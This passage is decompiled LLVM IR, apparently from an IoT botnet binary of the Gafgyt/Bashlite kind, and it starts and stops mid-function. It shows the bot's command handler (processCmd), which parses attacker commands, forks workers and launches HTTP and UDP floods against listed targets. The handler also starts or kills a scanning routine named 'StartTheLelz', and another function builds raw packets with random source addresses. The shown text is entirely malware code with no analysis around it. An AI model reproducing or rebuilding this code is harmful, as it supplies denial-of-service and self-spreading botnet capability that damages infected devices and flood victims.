  %v4_d410 = inttoptr i32 %v3_d410 to i8*
  store i8 %v1_d410, i8* %v4_d410, align 1
  store i32 %v1_d2f8, i32* %r3.global-to-local, align 4
  %v2_d424 = load i8, i8* %v1_d2fc, align 2
  %v3_d424 = zext i8 %v2_d424 to i32
  store i32 %v3_d424, i32* %r2.global-to-local, align 4
  %v3_d428 = load i8, i8* %v2_d300, align 1
  %v4_d428 = zext i8 %v3_d428 to i32
  %v4_d42c = mul nuw nsw i32 %v4_d428, 256
  %v5_d42c = or i32 %v4_d42c, %v3_d424
  store i32 %v5_d42c, i32* %r3.global-to-local, align 4
  %v3_d438 = call i32 @csum(i8* %v4_d038, i32 %v5_d42c)
  %sext6 = mul i32 %v3_d438, 16777216
  %v1_d43c = sdiv i32 %sext6, 16777216
  store i32 %v1_d43c, i32* %r3.global-to-local, align 4
  store i32 %v3_cfdc, i32* %r2.global-to-local, align 4
  %v1_d444 = trunc i32 %v1_d43c to i8
  store i8 %v1_d444, i8* %v4_d31c, align 2
  %v0_d448 = load i32, i32* %r3.global-to-local, align 4
  %v3_d44831 = udiv i32 %v0_d448, 256
  %v1_d44c = trunc i32 %v3_d44831 to i8
  %v2_d44c = load i32, i32* %r2.global-to-local, align 4
  %v3_d44c = add i32 %v2_d44c, 11
  %v4_d44c = inttoptr i32 %v3_d44c to i8*
  store i8 %v1_d44c, i8* %v4_d44c, align 1
  store i32 %stack_var_-88.0, i32* %r3.global-to-local, align 4
  %v9_d458 = icmp eq i32 %stack_var_-88.0, %arg7
  br i1 %v9_d458, label %dec_label_pc_d460, label %dec_label_pc_d484

dec_label_pc_d460:                                ; preds = %dec_label_pc_d34c
  %v2_d464 = call i32 @__GI_time(i32* null)
  store i32 %v2_d464, i32* %r2.global-to-local, align 4
  store i32 %v2_d338, i32* %r3.global-to-local, align 4
  %v8_d474 = icmp sgt i32 %v2_d464, %v2_d338
  br i1 %v8_d474, label %dec_label_pc_d494, label %dec_label_pc_d478

dec_label_pc_d478:                                ; preds = %dec_label_pc_d460
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_d34c

dec_label_pc_d484:                                ; preds = %dec_label_pc_d34c
  %v1_d488 = add i32 %stack_var_-88.0, 1
  store i32 %v1_d488, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_d34c

dec_label_pc_d494:                                ; preds = %dec_label_pc_d460, %dec_label_pc_cf40, %dec_label_pc_cf00, %dec_label_pc_cedc
  %v12_d49c = phi i32 [ %v6_cf64, %dec_label_pc_cf40 ], [ 0, %dec_label_pc_cf00 ], [ %v3_ceec, %dec_label_pc_cedc ], [ %v2_d464, %dec_label_pc_d460 ]
  store i32 %v3_ce50, i32* @r4, align 4
  store i32 %v6_ce50, i32* @fp, align 4
  ret i32 %v12_d49c

; uselistorder directives
  uselistorder i32 %v1_d488, { 1, 0 }
  uselistorder i32 %v1_d43c, { 1, 0 }
  uselistorder i32 %v1_d400, { 1, 0 }
  uselistorder i32 %v0_d3c4, { 1, 0 }
  uselistorder i32 %v3_d3ac, { 1, 0 }
  uselistorder i32 %v0_d394, { 1, 0 }
  uselistorder i32 %stack_var_-88.0, { 0, 2, 1 }
  uselistorder i32 %v2_d338, { 1, 0, 2 }
  uselistorder i32 %v3_d320, { 1, 0 }
  uselistorder i32 %v1_d314, { 1, 0 }
  uselistorder i32 %v1_d2f8, { 0, 2, 1 }
  uselistorder i32 %v1_d2d8, { 1, 0 }
  uselistorder i32 %v3_d2c4, { 2, 0, 1 }
  uselistorder i8 %v0_d280.sink.off0, { 1, 0 }
  uselistorder i32 %v3_d2a0, { 1, 0 }
  uselistorder i32 %v0_d280, { 1, 0 }
  uselistorder i32 %v0_d234, { 1, 0 }
  uselistorder i32 %v2_d21c, { 1, 0, 2 }
  uselistorder i32 %storemerge1421, { 5, 4, 3, 2, 0, 1 }
  uselistorder i8* %v2_d148, { 4, 5, 3, 6, 2, 7, 1, 8, 0, 9 }
  uselistorder i8* %v2_d0bc, { 1, 5, 2, 6, 3, 7, 4, 8, 0, 9 }
  uselistorder i32 %v3_d054, { 1, 0 }
  uselistorder i32 %v0_d03c, { 1, 0 }
  uselistorder i32 %v1_cffc, { 5, 7, 6, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 22, 21, 20, 19, 18, 0, 1, 2, 3, 4, 23, 24, 25, 26 }
  uselistorder i32 %v3_cfdc, { 12, 11, 10, 8, 6, 23, 9, 7, 4, 5, 22, 3, 21, 20, 19, 18, 17, 16, 24, 15, 14, 13, 2, 1, 0 }
  uselistorder i32 %v1_cfac, { 1, 0 }
  uselistorder i32 %v3_cec0, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 2, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 1, 0, 2 }
  uselistorder i32* %stack_var_-68, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 6, 7, 4, 5, 11, 12, 8, 9, 10, 13, 14, 15, 16, 17, 18, 19, 20, 21, 24, 25, 22, 23, 27, 28, 26, 29, 30, 31, 32, 33, 34, 35, 36, 37, 53, 38, 39, 40, 41, 43, 42, 44, 46, 45, 47, 49, 48, 50, 52, 51, 80, 54, 55, 56, 57, 58, 59, 62, 60, 61, 63, 64, 65, 66, 68, 67, 69, 70, 72, 71, 73, 74, 76, 75, 77, 78, 79, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 11, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @tcpcsum, { 1, 0 }
  uselistorder i32 (i32)* @htonl, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @GetRandomIP, { 3, 2, 1, 0 }
  uselistorder i32 ()* @rand_cmwc, { 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg4, { 0, 2, 1, 3 }
  uselistorder i32 %arg2, { 0, 2, 1, 4, 3 }
  uselistorder label %dec_label_pc_d2b4, { 1, 0 }
  uselistorder label %dec_label_pc_d214, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_d128, { 1, 0 }
  uselistorder label %dec_label_pc_cfa8, { 1, 0 }
  uselistorder label %dec_label_pc_cedc, { 1, 0 }
}

define i32 @processCmd(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-4 = alloca i32, align 4
  %v3_d4c0 = load i32, i32* @r4, align 4
  %v6_d4c0 = load i32, i32* @r5, align 4
  %v9_d4c0 = load i32, i32* @r6, align 4
  %v12_d4c0 = load i32, i32* @r7, align 4
  %v15_d4c0 = load i32, i32* @r8, align 4
  %v18_d4c0 = load i32, i32* @fp, align 4
  store i32 54472, i32* %stack_var_-4, align 4
  %v2_d4c4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_d4c4, i32* @fp, align 4
  %v2_d4d8 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_18b64.218 to i32), i32* @r1, align 4
  %v3_d4e4 = inttoptr i32 %v2_d4d8 to i8*
  %v4_d4e4 = call i32 @__GI_strcoll(i8* %v3_d4e4, i32 ptrtoint ([5 x i8]* @global_var_18b64.218 to i32))
  %v2_d4ec = icmp eq i32 %v4_d4e4, 0
  br i1 %v2_d4ec, label %dec_label_pc_e040, label %dec_label_pc_d4f4

dec_label_pc_d4f4:                                ; preds = %entry
  %v2_d4f8 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_18b6c.220 to i32), i32* @r1, align 4
  %v3_d504 = inttoptr i32 %v2_d4f8 to i8*
  %v4_d504 = call i32 @__GI_strcoll(i8* %v3_d504, i32 ptrtoint ([6 x i8]* @global_var_18b6c.220 to i32))
  %v2_d50c = icmp eq i32 %v4_d504, 0
  br i1 %v2_d50c, label %dec_label_pc_d514, label %dec_label_pc_d5f4

dec_label_pc_d514:                                ; preds = %dec_label_pc_d4f4
  %v1_d518 = add i32 %tmp, 4
  %v1_d51c = inttoptr i32 %v1_d518 to i32*
  %v2_d51c = load i32, i32* %v1_d51c, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_18b74.222 to i32), i32* @r1, align 4
  %v3_d528 = inttoptr i32 %v2_d51c to i8*
  %v4_d528 = call i32 @__GI_strcoll(i8* %v3_d528, i32 ptrtoint ([4 x i8]* @global_var_18b74.222 to i32))
  %v2_d530 = icmp eq i32 %v4_d528, 0
  br i1 %v2_d530, label %dec_label_pc_d538, label %dec_label_pc_d568

dec_label_pc_d538:                                ; preds = %dec_label_pc_d514
  %v2_d53c = load i32, i32* @global_var_28aec.224, align 4
  %v2_d540 = icmp eq i32 %v2_d53c, 0
  br i1 %v2_d540, label %dec_label_pc_e040, label %dec_label_pc_d548

dec_label_pc_d548:                                ; preds = %dec_label_pc_d538
  %v0_d558 = call i32 @kill()
  store i32 0, i32* @global_var_28aec.224, align 4
  br label %dec_label_pc_d568

dec_label_pc_d568:                                ; preds = %dec_label_pc_d514, %dec_label_pc_d548
  %v2_d570 = load i32, i32* %v1_d51c, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_18b78.226 to i32), i32* @r1, align 4
  %v3_d57c = inttoptr i32 %v2_d570 to i8*
  %v4_d57c = call i32 @__GI_strcoll(i8* %v3_d57c, i32 ptrtoint ([3 x i8]* @global_var_18b78.226 to i32))
  %v2_d584 = icmp eq i32 %v4_d57c, 0
  br i1 %v2_d584, label %dec_label_pc_d58c, label %dec_label_pc_d5f4

dec_label_pc_d58c:                                ; preds = %dec_label_pc_d568
  %v2_d590 = load i32, i32* @global_var_28aec.224, align 4
  %v2_d594 = icmp eq i32 %v2_d590, 0
  br i1 %v2_d594, label %dec_label_pc_d59c, label %dec_label_pc_e040

dec_label_pc_d59c:                                ; preds = %dec_label_pc_d58c
  %v0_d59c = call i32 @__libc_fork()
  %v2_d5bc = icmp eq i32 %v0_d59c, 0
  br i1 %v2_d5bc, label %dec_label_pc_d5e0, label %dec_label_pc_d5c4

dec_label_pc_d5c4:                                ; preds = %dec_label_pc_d59c
  store i32 %v0_d59c, i32* @global_var_28aec.224, align 4
  br label %dec_label_pc_e040

dec_label_pc_d5e0:                                ; preds = %dec_label_pc_d59c
  %v2_d5e8 = call i32 @StartTheLelz(i32 10, i32 1000)
  %v1_d5f0 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_d5f4:                                ; preds = %dec_label_pc_d568, %dec_label_pc_d4f4
  %v2_d5f8 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_18b7c.228 to i32), i32* @r1, align 4
  %v3_d604 = inttoptr i32 %v2_d5f8 to i8*
  %v4_d604 = call i32 @__GI_strcoll(i8* %v3_d604, i32 ptrtoint ([5 x i8]* @global_var_18b7c.228 to i32))
  %v2_d60c = icmp eq i32 %v4_d604, 0
  br i1 %v2_d60c, label %dec_label_pc_d614, label %dec_label_pc_d788

dec_label_pc_d614:                                ; preds = %dec_label_pc_d5f4
  %v7_d61c = icmp slt i32 %arg1, 6
  br i1 %v7_d61c, label %dec_label_pc_e040, label %dec_label_pc_d620

dec_label_pc_d620:                                ; preds = %dec_label_pc_d614
  %v1_d624 = add i32 %tmp, 12
  %v1_d628 = inttoptr i32 %v1_d624 to i32*
  %v2_d628 = load i32, i32* %v1_d628, align 4
  store i32 %v2_d628, i32* @r0, align 4
  %v1_d630 = call i32 @atol(i32 %v2_d628)
  %tmp88 = icmp slt i32 %v1_d630, 1
  br i1 %tmp88, label %dec_label_pc_e040, label %dec_label_pc_d640

dec_label_pc_d640:                                ; preds = %dec_label_pc_d620
  %v1_d644 = add i32 %tmp, 20
  %v1_d648 = inttoptr i32 %v1_d644 to i32*
  %v2_d648 = load i32, i32* %v1_d648, align 4
  store i32 %v2_d648, i32* @r0, align 4
  %v1_d650 = call i32 @atol(i32 %v2_d648)
  %v5_d65c = icmp sgt i32 %v1_d650, 0
  br i1 %v5_d65c, label %dec_label_pc_d664, label %dec_label_pc_e040

dec_label_pc_d664:                                ; preds = %dec_label_pc_d640
  %v0_d664 = call i32 @listFork()
  %v2_d66c = icmp eq i32 %v0_d664, 0
  br i1 %v2_d66c, label %dec_label_pc_d674, label %dec_label_pc_e040

dec_label_pc_d674:                                ; preds = %dec_label_pc_d664
  %v2_d678 = load i32, i32* @global_var_22864.48, align 4
  store i32 %v2_d678, i32* @r5, align 4
  %v1_d680 = add i32 %tmp, 4
  %v1_d684 = inttoptr i32 %v1_d680 to i32*
  %v2_d684 = load i32, i32* %v1_d684, align 4
  store i32 %v2_d684, i32* @r6, align 4
  %v1_d68c = add i32 %tmp, 8
  %v1_d690 = inttoptr i32 %v1_d68c to i32*
  %v2_d690 = load i32, i32* %v1_d690, align 4
  store i32 %v2_d690, i32* @r7, align 4
  %v2_d69c = load i32, i32* %v1_d628, align 4
  store i32 %v2_d69c, i32* @r0, align 4
  %v1_d6a4 = call i32 @atol(i32 %v2_d69c)
  store i32 %v1_d6a4, i32* @r4, align 4
  %v2_d6b4 = load i32, i32* %v1_d648, align 4
  store i32 %v2_d6b4, i32* @r0, align 4
  %v1_d6bc = call i32 @atol(i32 %v2_d6b4)
  %v0_d6cc = load i32, i32* @r5, align 4
  %v0_d6d4 = load i32, i32* @r6, align 4
  %v0_d6d8 = load i32, i32* @r7, align 4
  %v7_d6dc = call i32 @Rootsprintf(i32 %v0_d6cc, i32 ptrtoint ([38 x i8]* @global_var_18b84.231 to i32), i32 %v0_d6d4, i32 %v0_d6d8)
  %v2_d6e8 = load i32, i32* %v1_d684, align 4
  store i32 %v2_d6e8, i32* @r5, align 4
  %v2_d6f8 = load i32, i32* %v1_d690, align 4
  store i32 %v2_d6f8, i32* @r6, align 4
  %v2_d708 = load i32, i32* %v1_d628, align 4
  store i32 %v2_d708, i32* @r0, align 4
  %v1_d710 = call i32 @atol(i32 %v2_d708)
  %v3_d71c = urem i32 %v1_d710, 65536
  store i32 %v3_d71c, i32* @r7, align 4
  %v1_d728 = add i32 %tmp, 16
  %v1_d72c = inttoptr i32 %v1_d728 to i32*
  %v2_d72c = load i32, i32* %v1_d72c, align 4
  store i32 %v2_d72c, i32* @r8, align 4
  %v2_d73c = load i32, i32* %v1_d648, align 4
  store i32 %v2_d73c, i32* @r0, align 4
  %v1_d744 = call i32 @atol(i32 %v2_d73c)
  store i32 %v1_d744, i32* @r4, align 4
  %v1_d750 = add i32 %tmp, 24
  %v1_d754 = inttoptr i32 %v1_d750 to i32*
  %v2_d754 = load i32, i32* %v1_d754, align 4
  store i32 %v2_d754, i32* @r0, align 4
  %v1_d75c = call i32 @atol(i32 %v2_d754)
  %v0_d764 = load i32, i32* @r4, align 4
  %v0_d76c = load i32, i32* @r5, align 4
  %v0_d770 = load i32, i32* @r6, align 4
  %v0_d774 = load i32, i32* @r7, align 4
  %v0_d778 = load i32, i32* @r8, align 4
  %v6_d77c = trunc i32 %v0_d774 to i8
  %v7_d77c = call i32 @sendHTTP(i32 %v0_d76c, i32 %v0_d770, i8 %v6_d77c, i32 %v0_d778, i32 %v0_d764, i32 %v1_d75c)
  %v1_d784 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_d788

dec_label_pc_d788:                                ; preds = %dec_label_pc_d5f4, %dec_label_pc_d674
  %v2_d78c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_18bac.233 to i32), i32* @r1, align 4
  %v3_d798 = inttoptr i32 %v2_d78c to i8*
  %v4_d798 = call i32 @__GI_strcoll(i8* %v3_d798, i32 ptrtoint ([4 x i8]* @global_var_18bac.233 to i32))
  %v2_d7a0 = icmp eq i32 %v4_d798, 0
  br i1 %v2_d7a0, label %dec_label_pc_d7a8, label %dec_label_pc_daf4

dec_label_pc_d7a8:                                ; preds = %dec_label_pc_d788
  %v7_d7b0 = icmp slt i32 %arg1, 6
  br i1 %v7_d7b0, label %dec_label_pc_e040, label %dec_label_pc_d7b4

dec_label_pc_d7b4:                                ; preds = %dec_label_pc_d7a8
  %v1_d7b8 = add i32 %tmp, 12
  %v1_d7bc = inttoptr i32 %v1_d7b8 to i32*
  %v2_d7bc = load i32, i32* %v1_d7bc, align 4
  store i32 %v2_d7bc, i32* @r0, align 4
  %v1_d7c4 = call i32 @atol(i32 %v2_d7bc)
  %v7_d7cc = icmp eq i32 %v1_d7c4, -1
  br i1 %v7_d7cc, label %dec_label_pc_e040, label %dec_label_pc_d7d4

dec_label_pc_d7d4:                                ; preds = %dec_label_pc_d7b4
  %v1_d7d8 = add i32 %tmp, 8
  %v1_d7dc = inttoptr i32 %v1_d7d8 to i32*
  %v2_d7dc = load i32, i32* %v1_d7dc, align 4
  store i32 %v2_d7dc, i32* @r0, align 4
  %v1_d7e4 = call i32 @atol(i32 %v2_d7dc)
  %v7_d7ec = icmp eq i32 %v1_d7e4, -1
  br i1 %v7_d7ec, label %dec_label_pc_e040, label %dec_label_pc_d7f4

dec_label_pc_d7f4:                                ; preds = %dec_label_pc_d7d4
  %v1_d7f8 = add i32 %tmp, 16
  %v1_d7fc = inttoptr i32 %v1_d7f8 to i32*
  %v2_d7fc = load i32, i32* %v1_d7fc, align 4
  store i32 %v2_d7fc, i32* @r0, align 4
  %v1_d804 = call i32 @atol(i32 %v2_d7fc)
  %v7_d80c = icmp eq i32 %v1_d804, -1
  br i1 %v7_d80c, label %dec_label_pc_e040, label %dec_label_pc_d814

dec_label_pc_d814:                                ; preds = %dec_label_pc_d7f4
  %v1_d818 = add i32 %tmp, 20
  %v1_d81c = inttoptr i32 %v1_d818 to i32*
  %v2_d81c = load i32, i32* %v1_d81c, align 4
  store i32 %v2_d81c, i32* @r0, align 4
  %v1_d824 = call i32 @atol(i32 %v2_d81c)
  %v7_d82c = icmp eq i32 %v1_d824, -1
  br i1 %v7_d82c, label %dec_label_pc_e040, label %dec_label_pc_d834

dec_label_pc_d834:                                ; preds = %dec_label_pc_d814
  %v2_d83c = load i32, i32* %v1_d81c, align 4
  store i32 %v2_d83c, i32* @r0, align 4
  %v1_d844 = call i32 @atol(i32 %v2_d83c)
  %v8_d850 = icmp sgt i32 %v1_d844, 65536
  br i1 %v8_d850, label %dec_label_pc_e040, label %dec_label_pc_d854

dec_label_pc_d854:                                ; preds = %dec_label_pc_d834
  %v2_d85c = load i32, i32* %v1_d81c, align 4
  store i32 %v2_d85c, i32* @r0, align 4
  %v1_d864 = call i32 @atol(i32 %v2_d85c)
  %v8_d878 = icmp sgt i32 %v1_d864, 65500
  br i1 %v8_d878, label %dec_label_pc_e040, label %dec_label_pc_d87c

dec_label_pc_d87c:                                ; preds = %dec_label_pc_d854
  %v2_d884 = load i32, i32* %v1_d7fc, align 4
  store i32 %v2_d884, i32* @r0, align 4
  %v1_d88c = call i32 @atol(i32 %v2_d884)
  %v8_d898 = icmp sgt i32 %v1_d88c, 32
  br i1 %v8_d898, label %dec_label_pc_e040, label %dec_label_pc_d89c

dec_label_pc_d89c:                                ; preds = %dec_label_pc_d87c
  %v7_d8a0 = icmp eq i32 %arg1, 7
  br i1 %v7_d8a0, label %dec_label_pc_d8a8, label %dec_label_pc_d8cc

dec_label_pc_d8a8:                                ; preds = %dec_label_pc_d89c
  %v1_d8ac = add i32 %tmp, 24
  %v1_d8b0 = inttoptr i32 %v1_d8ac to i32*
  %v2_d8b0 = load i32, i32* %v1_d8b0, align 4
  store i32 %v2_d8b0, i32* @r0, align 4
  %v1_d8b8 = call i32 @atol(i32 %v2_d8b0)
  %v5_d8c4 = icmp sgt i32 %v1_d8b8, 0
  br i1 %v5_d8c4, label %dec_label_pc_d8cc, label %dec_label_pc_e040

dec_label_pc_d8cc:                                ; preds = %dec_label_pc_d89c, %dec_label_pc_d8a8
  %v1_d8d0 = add i32 %tmp, 4
  %v1_d8d4 = inttoptr i32 %v1_d8d0 to i32*
  %v2_d8d4 = load i32, i32* %v1_d8d4, align 4
  %v2_d8e4 = load i32, i32* %v1_d7dc, align 4
  store i32 %v2_d8e4, i32* @r0, align 4
  %v1_d8ec = call i32 @atol(i32 %v2_d8e4)
  %v2_d900 = load i32, i32* %v1_d7bc, align 4
  store i32 %v2_d900, i32* @r0, align 4
  %v1_d908 = call i32 @atol(i32 %v2_d900)
  %v2_d91c = load i32, i32* %v1_d7fc, align 4
  store i32 %v2_d91c, i32* @r0, align 4
  %v1_d924 = call i32 @atol(i32 %v2_d91c)
  %v2_d938 = load i32, i32* %v1_d81c, align 4
  store i32 %v2_d938, i32* @r0, align 4
  %v1_d940 = call i32 @atol(i32 %v2_d938)
  %v7_d954 = icmp slt i32 %arg1, 7
  br i1 %v7_d954, label %dec_label_pc_d974, label %dec_label_pc_d958

dec_label_pc_d958:                                ; preds = %dec_label_pc_d8cc
  %v1_d95c = add i32 %tmp, 24
  %v1_d960 = inttoptr i32 %v1_d95c to i32*
  %v2_d960 = load i32, i32* %v1_d960, align 4
  store i32 %v2_d960, i32* @r0, align 4
  %v1_d968 = call i32 @atol(i32 %v2_d960)
  br label %dec_label_pc_d97c

dec_label_pc_d974:                                ; preds = %dec_label_pc_d8cc
  br label %dec_label_pc_d97c

dec_label_pc_d97c:                                ; preds = %dec_label_pc_d958, %dec_label_pc_d974
  %storemerge8 = phi i32 [ 1000, %dec_label_pc_d974 ], [ %v1_d968, %dec_label_pc_d958 ]
  %v7_d98c = icmp slt i32 %arg1, 8
  br i1 %v7_d98c, label %dec_label_pc_d9ac, label %dec_label_pc_d990

dec_label_pc_d990:                                ; preds = %dec_label_pc_d97c
  %v1_d994 = add i32 %tmp, 28
  %v1_d998 = inttoptr i32 %v1_d994 to i32*
  %v2_d998 = load i32, i32* %v1_d998, align 4
  store i32 %v2_d998, i32* @r0, align 4
  %v1_d9a0 = call i32 @atol(i32 %v2_d998)
  br label %dec_label_pc_d9c0

dec_label_pc_d9ac:                                ; preds = %dec_label_pc_d97c
  br label %dec_label_pc_d9c0

dec_label_pc_d9c0:                                ; preds = %dec_label_pc_d990, %dec_label_pc_d9ac
  %storemerge7 = phi i32 [ 1000000, %dec_label_pc_d9ac ], [ %v1_d9a0, %dec_label_pc_d990 ]
  %v7_d9d0 = icmp slt i32 %arg1, 9
  br i1 %v7_d9d0, label %dec_label_pc_d9f0, label %dec_label_pc_d9d4

dec_label_pc_d9d4:                                ; preds = %dec_label_pc_d9c0
  %v1_d9d8 = add i32 %tmp, 32
  %v1_d9dc = inttoptr i32 %v1_d9d8 to i32*
  %v2_d9dc = load i32, i32* %v1_d9dc, align 4
  store i32 %v2_d9dc, i32* @r0, align 4
  %v1_d9e4 = call i32 @atol(i32 %v2_d9dc)
  br label %dec_label_pc_d9f8

dec_label_pc_d9f0:                                ; preds = %dec_label_pc_d9c0
  br label %dec_label_pc_d9f8

dec_label_pc_d9f8:                                ; preds = %dec_label_pc_d9d4, %dec_label_pc_d9f0
  %storemerge6 = phi i32 [ 0, %dec_label_pc_d9f0 ], [ %v1_d9e4, %dec_label_pc_d9d4 ]
  %v2_da0c = call i32 @__GI_strchr(i32 %v2_d8d4, i32 44)
  %v2_da14 = icmp eq i32 %v2_da0c, 0
  br i1 %v2_da14, label %dec_label_pc_daa8, label %dec_label_pc_da1c

dec_label_pc_da1c:                                ; preds = %dec_label_pc_d9f8
  store i32 %v2_d8d4, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_18b4c.206 to i32), i32* @r1, align 4
  %v2_da28 = call i32 @__GI_strtok(i32 %v2_d8d4, i32 ptrtoint (i32* @global_var_18b4c.206 to i32))
  %v2_da9c21 = icmp eq i32 %v2_da28, 0
  br i1 %v2_da9c21, label %dec_label_pc_e040, label %dec_label_pc_da38

dec_label_pc_da38:                                ; preds = %dec_label_pc_da1c, %dec_label_pc_da84
  %storemerge1522 = phi i32 [ %v2_da8c, %dec_label_pc_da84 ], [ %v2_da28, %dec_label_pc_da1c ]
  %v0_da38 = call i32 @listFork()
  %v2_da40 = icmp eq i32 %v0_da38, 0
  br i1 %v2_da40, label %dec_label_pc_da48, label %dec_label_pc_da84

dec_label_pc_da48:                                ; preds = %dec_label_pc_da38
  %v8_da78 = call i32 @sendUDP(i32 %storemerge1522, i32 %v1_d8ec, i32 %v1_d908, i32 %v1_d924, i32 %v1_d940, i32 %storemerge8, i32 %storemerge7, i32 %storemerge6)
  %v1_da80 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_da84:                                ; preds = %dec_label_pc_da38
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_18b4c.206 to i32), i32* @r1, align 4
  %v2_da8c = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_18b4c.206 to i32))
  %v2_da9c = icmp eq i32 %v2_da8c, 0
  br i1 %v2_da9c, label %dec_label_pc_e040, label %dec_label_pc_da38

dec_label_pc_daa8:                                ; preds = %dec_label_pc_d9f8
  %v0_daa8 = call i32 @listFork()
  %v2_dab0 = icmp eq i32 %v0_daa8, 0
  br i1 %v2_dab0, label %dec_label_pc_dab8, label %dec_label_pc_e040

dec_label_pc_dab8:                                ; preds = %dec_label_pc_daa8
  %v8_dae8 = call i32 @sendUDP(i32 %v2_d8d4, i32 %v1_d8ec, i32 %v1_d908, i32 %v1_d924, i32 %v1_d940, i32 %storemerge8, i32 %storemerge7, i32 %storemerge6)
  %v1_daf0 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_daf4:                                ; preds = %dec_label_pc_d788
  %v2_daf8 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_18bb0.236 to i32), i32* @r1, align 4
  %v3_db04 = inttoptr i32 %v2_daf8 to i8*
  %v4_db04 = call i32 @__GI_strcoll(i8* %v3_db04, i32 ptrtoint ([4 x i8]* @global_var_18bb0.236 to i32))
  %v2_db0c = icmp eq i32 %v4_db04, 0
  br i1 %v2_db0c, label %dec_label_pc_db14, label %dec_label_pc_ddc4

dec_label_pc_db14:                                ; preds = %dec_label_pc_daf4
  %v7_db1c = icmp slt i32 %arg1, 6
  br i1 %v7_db1c, label %dec_label_pc_e040, label %dec_label_pc_db20

dec_label_pc_db20:                                ; preds = %dec_label_pc_db14
  %v1_db24 = add i32 %tmp, 12
  %v1_db28 = inttoptr i32 %v1_db24 to i32*
  %v2_db28 = load i32, i32* %v1_db28, align 4
  store i32 %v2_db28, i32* @r0, align 4
  %v1_db30 = call i32 @atol(i32 %v2_db28)
  %v7_db38 = icmp eq i32 %v1_db30, -1
  br i1 %v7_db38, label %dec_label_pc_e040, label %dec_label_pc_db40

dec_label_pc_db40:                                ; preds = %dec_label_pc_db20
  %v1_db44 = add i32 %tmp, 8
  %v1_db48 = inttoptr i32 %v1_db44 to i32*
  %v2_db48 = load i32, i32* %v1_db48, align 4
  store i32 %v2_db48, i32* @r0, align 4
  %v1_db50 = call i32 @atol(i32 %v2_db48)
  %v7_db58 = icmp eq i32 %v1_db50, -1
  br i1 %v7_db58, label %dec_label_pc_e040, label %dec_label_pc_db60

dec_label_pc_db60:                                ; preds = %dec_label_pc_db40
  %v1_db64 = add i32 %tmp, 16
  %v1_db68 = inttoptr i32 %v1_db64 to i32*
  %v2_db68 = load i32, i32* %v1_db68, align 4
  store i32 %v2_db68, i32* @r0, align 4
  %v1_db70 = call i32 @atol(i32 %v2_db68)
  %v7_db78 = icmp eq i32 %v1_db70, -1
  br i1 %v7_db78, label %dec_label_pc_e040, label %dec_label_pc_db80

dec_label_pc_db80:                                ; preds = %dec_label_pc_db60
  %v2_db88 = load i32, i32* %v1_db68, align 4
  store i32 %v2_db88, i32* @r0, align 4
  %v1_db90 = call i32 @atol(i32 %v2_db88)
  %v8_db9c = icmp sgt i32 %v1_db90, 32
  br i1 %v8_db9c, label %dec_label_pc_e040, label %dec_label_pc_dba0

dec_label_pc_dba0:                                ; preds = %dec_label_pc_db80
  %v7_dba8 = icmp slt i32 %arg1, 7
  br i1 %v7_dba8, label %dec_label_pc_dbcc, label %dec_label_pc_dbac

dec_label_pc_dbac:                                ; preds = %dec_label_pc_dba0
  %v1_dbb0 = add i32 %tmp, 24
  %v1_dbb4 = inttoptr i32 %v1_dbb0 to i32*
  %v2_dbb4 = load i32, i32* %v1_dbb4, align 4
  store i32 %v2_dbb4, i32* @r0, align 4
  %v1_dbbc = call i32 @atol(i32 %v2_dbb4)
  %v1_dbc4 = icmp slt i32 %v1_dbbc, 0
  br i1 %v1_dbc4, label %dec_label_pc_e040, label %dec_label_pc_dbcc

dec_label_pc_dbcc:                                ; preds = %dec_label_pc_dbac, %dec_label_pc_dba0
  %v7_dbd0 = icmp eq i32 %arg1, 8
  br i1 %v7_dbd0, label %dec_label_pc_dbd8, label %dec_label_pc_dbfc

dec_label_pc_dbd8:                                ; preds = %dec_label_pc_dbcc
  %v1_dbdc = add i32 %tmp, 28
  %v1_dbe0 = inttoptr i32 %v1_dbdc to i32*
  %v2_dbe0 = load i32, i32* %v1_dbe0, align 4
  store i32 %v2_dbe0, i32* @r0, align 4
  %v1_dbe8 = call i32 @atol(i32 %v2_dbe0)
  %v5_dbf4 = icmp sgt i32 %v1_dbe8, 0
  br i1 %v5_dbf4, label %dec_label_pc_dbfc, label %dec_label_pc_e040

dec_label_pc_dbfc:                                ; preds = %dec_label_pc_dbcc, %dec_label_pc_dbd8
  %v1_dc00 = add i32 %tmp, 4
